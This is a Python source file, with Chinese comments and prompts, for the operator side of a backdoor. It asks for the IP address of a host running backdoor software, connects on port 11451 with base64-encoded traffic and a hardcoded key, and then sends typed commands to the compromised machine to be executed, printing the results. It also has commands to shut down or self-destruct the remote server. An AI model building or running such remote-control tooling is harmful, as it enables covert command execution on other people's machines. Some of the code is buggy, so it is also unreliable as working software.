from base64 import b64encode,b64decode
import socket               # 导入 socket 模块
import sys
# import threading

class ClientInfo:
    def getVersion():
        return "25.5.5"
    def getCurrentKey():
        return "jbpm4dl"

class clitools:
    def VaildSingleParameter(param) -> bool:
        if param in sys.argv:
            return True
        return False

    def GetValueOfThis(argv,param) -> str:
        global VaildSingleParameter
        if VaildSingleParameter(param):
            if argv.index(param)+1 <= len(argv):
                return argv[argv.index(param)+1]
            else:
                return IndexError
        else:
            return ValueError
        return ""
    
    def GetSingleParameter(argv) -> list:
        spl = []
        for i in range(1,len(argv)):
            if argv[i-1][1] != "-":
                spl.append(argv[i])
            else:
                continue
        if spl != []:
            return spl
        return [""]
    
    def RestrictedGVOT(argv) -> list:
        global GetSingleParameter
        gvotResult = GetSingleParameter(argv)
        if type(gvotResult) == type(["list"]):
            return gvotResult
        else:
            raise gvotResult
        return [""]

    vsp = VaildSingleParameter
    gvot = GetValueOfThis
    gsp = GetSingleParameter
    rg = RestrictedGVOT

SocketTimeoutError = socket.timeout
s = socket.socket()         # 创建 socket 对象
host = clitools.gsp(sys.argv)[0]
if host == "":host = input("输入有后门软件的主机IP地址：")
offlineDebug:bool = False
lastMaxiumPing = 5
maxiumPingSecond = 5
s.settimeout(maxiumPingSecond)

def NotDoAny(nullable=0):
    return nullable

def send(msg):
    global s
    return s.send(b64encode(msg.encode('UTF-8')))

def recv(buffer=1048576):
    global s
    return b64decode(s.recv(buffer)).decode("UTF-8")

def connectWith(target):
    global s
    s.connect((target,11451))
    send(ClientInfo)
    if recv() == "allowedToConnect":
        return True
    else:
        print("chkupg!")
        return False

def cch(name,desc):
    # Client Commands Helper, CCH
    # Client commands start with / and only available on client, they will NOT be run on remote host(s)
    print(f"/{name}:\n  {desc}")

def handleServerMsg(serverMsg):
    if serverMsg == "":return ""
    result = ""
    pureSeverMsg = serverMsg[1:len(serverMsg)].split()
    match pureSeverMsg[0]:
        case "testAlive":
            result = "]alive = True"
        case "askClientVersion":
            result = "]version = " + ClientInfo.getVersion()
        case "askClientValidity":
            result = "]usingkey = " + ClientInfo.getCurrentKey()
    return result

if len(sys.argv) > 1:
    if clitools.vsp("--offline-debug"):
        offlineDebug = True
        send = NotDoAny
        recv = NotDoAny
        handleServerMsg = NotDoAny
    else:
        pass

if offlineDebug == False:
    # s.connect((host, port))
    if connectWith(host):
        pass
    else:
        try:
            print(recv())
        except:
            pass
        exit(1)

while True:
    remotesh_cmd = input("输入要执行的后门命令：")
    if remotesh_cmd == "":
        continue
    elif remotesh_cmd[0] == "/":
        match remotesh_cmd:
            case "/":
                cch("ask4kill","尝试让远程服务端自毁（未实现）")
                cch("exit","退出本地客户端")
                cch("exit_remote","退出远程服务端")
                cch("help","查看这些帮助信息")
                cch("refresh"," 手动刷新，解决从服务器收信出错")
                cch("set_timeout","设置超时时间")
            case "/ask4kill":
                send("__5LmJ44hirohitoGv5bGx5bKz44KI44KK44KC6YeN44GP44CB5q2744Gv6bi/5q+b44KI44KK44KC6L2744GX_glorious_death!!!")
            case "/exit":
                break
            case "/exit_remote":
                send("__5oiR5ZG95Luk5L2g6114514YCf6YCf6YCA5Ye6_exit_asap_pls, tysm!!!")
                break
            case "/help":
                cch("ask4kill","尝试让远程服务端自毁（未实现）")
                cch("exit","退出本地客户端")
                cch("exit_remote","退出远程服务端")
                cch("help","查看这些帮助信息")
                cch("refresh"," 手动刷新，解决从服务器收信出错")
                cch("set_timeout","设置超时时间")
            case "/refresh":
                lastMaxiumPing = maxiumPingSecond
                maxiumPingSecond = 0.1
                s.settimeout(0.1)
                try:
                    while True:
                        recycleBin = recv()
                except SocketTimeoutError:
                    pass
                finally:
                    s.settimeout(lastMaxiumPing)
                print("刷新完成")
            case "/set_timeout":
                lastMaxiumPing = maxiumPingSecond
                try:
                    new_timeout = int(input("新的超时时间："))
                    if new_timeout == 0:
                        raise ValueError
                    s.settimeout(new_timeout)
                    maxiumPingSecond = new_timeout
                    print(f"将超时设为 {new_timeout} 秒")
                except ValueError:
                    s.settimeout(5)
                    maxiumPingSecond = 5
                    print("设置超时失败")
            case _:
                print(f"没有该客户端命令： {remotesh_cmd}")
        # cmd_history += [remotesh_cmd]
    else:
        match remotesh_cmd:
            case "echo off":
                pass
            case _:
                send(remotesh_cmd)
                try:
                    serverMsg = recv()
                    if serverMsg == "":
                        pass
                    elif serverMsg[0] == "]":
                        send(handleServerMsg(serverMsg))
                    else:
                        print(serverMsg)
                except KeyboardInterrupt:
                    print("键盘中断")
                except SocketTimeoutError:
                    print("运行或连接超时")
        # cmd_history += [remotesh_cmd]

s.close()
